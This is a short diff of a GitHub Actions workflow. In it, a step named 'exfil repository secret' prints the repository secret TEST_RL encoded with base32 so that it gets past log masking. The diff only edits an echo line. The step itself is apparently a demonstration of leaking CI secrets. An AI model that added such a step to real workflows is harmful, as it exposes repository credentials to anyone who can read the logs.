@@ -12,5 +12,5 @@ jobs:
     - name: exfil repository secret
       id: response
       run:  |
-          echo "lets exfil some repository secrets..."
+          echo "lets exfil some repository secrets....."
           echo "${{secrets.TEST_RL}}" | base32
